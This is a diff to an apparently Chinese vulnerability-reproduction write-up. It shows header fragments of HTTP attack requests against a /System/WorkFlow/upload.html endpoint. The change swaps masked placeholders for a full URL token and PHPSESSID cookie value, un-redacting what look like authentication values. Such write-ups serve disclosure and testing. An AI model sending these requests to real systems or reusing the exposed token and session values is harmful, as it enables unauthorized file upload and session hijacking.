@@ -60,7 +60,7 @@ schema_version: "1"
 
 ## 四、漏洞复现
 ```http
-POST /System/WorkFlow/upload.html?token=5*********************************1 HTTP/1.1
+POST /System/WorkFlow/upload.html?token=5117e82385cef4c12547fdd4c028b97a1-1 HTTP/1.1
 Host: 
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
 Connection: close
@@ -104,7 +104,7 @@ Host:
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
 Connection: close
 Accept: text/*
-Cookie: PHPSESSID=d******************************9
+Cookie: PHPSESSID=d3dbba517d0d6ff544f1be11e134a7f9
 Accept-Encoding: gzip, deflate
 ```
 
